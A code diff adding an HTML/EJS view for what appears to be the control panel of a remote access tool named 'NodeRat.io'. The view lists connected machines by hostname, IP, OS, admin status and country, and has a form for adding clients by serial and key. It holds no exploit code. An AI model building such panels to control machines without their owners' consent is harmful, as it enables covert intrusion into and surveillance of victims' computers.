@@ -1,0 +1,60 @@
+<div class="row">
+  <div class="col-sm-1 clientListingHeader">ID</div>
+  <div class="col-sm-1 clientListingHeader">ONLINE</div>
+  <div class="col-sm-2 clientListingHeader">USERNAME</div>
+  <div class="col-sm-2 clientListingHeader">IP ADRESS</div>
+  <div class="col-sm-2 clientListingHeader">OS</div>
+  <div class="col-sm-1 clientListingHeader">VERSION</div>
+  <div class="col-sm-2 clientListingHeader">ADMINISTRATOR</div>
+  <div class="col-sm-1 clientListingHeader">COUNTRY</div>
+</div>
+<div class="row">
+  <div class="col-sm-12 clientListing">
+    <% clients.forEach(function(client){ %>
+      <a href="../client_dashboard/<%= client.client_id %>">
+      <div class="row clientListingRow">
+        <div class="col-sm-1">#<%= client.client_id %></div>
+        <div class="col-sm-1 textCentred"><img src="img/icons/offline.png" class="iconOnline" id='client_<%= client.client_id %>'></div>
+        <div class="col-sm-2"><%= client.client_hostname %></div>
+        <div class="col-sm-2"><%= client.client_ip %></div>
+        <div class="col-sm-2"><%= client.client_os %> (<%= client.client_os_version %>)</div>
+        <div class="col-sm-1"><%= client.client_version %></div>
+        <div class="col-sm-2 textCentred"><img src="img/icons/offline.png" class="iconOnline"></div>
+        <div class="col-sm-1"><%= client.client_country %></div>
+      </div>
+      </a>
+    <% }); %>
+    <button class="form-control btn-block btn-success" data-toggle="collapse" data-target="#addClosedClient" style="position:absolute;bottom:5px;right:5px;width:38px;"><span class="glyphLeft glyphicon glyphicon-plus"></span></button>
+  </div>
+
+</div>
+
+<div class="row defaultContainer collapse" id="addClosedClient" style="margin-bottom:20px;">
+  <form class="" action="" method="post">
+    <div class="col-sm-2">
+        <h4>Serial: </h4>
+    </div>
+    <div class="col-sm-4">
+        <input type="text" name="serial" value="" class="form-control">
+    </div>
+    <div class="col-sm-2">
+        <h4>key: </h4>
+    </div>
+    <div class="col-sm-4">
+        <input type="text" name="key" value="" class="form-control">
+    </div>
+    <div class="col-md-12">
+      <br>
+      <input type="submit" class="form-control btn-success" name="" value="Add a new client (only in closed mode)">
+    </div>
+  </form>
+</div>
+
+<div class="row">
+  <div class="col-sm-12 consoleLogs">
+    <p class="logs-success">[*] Welcome to NodeRat.io !</p>
+    <% logs.forEach(function(log){ %>
+      <p class="logs-info">[*]  <%= log.log_data %></p>
+    <% }); %>
+  </div>
+</div>
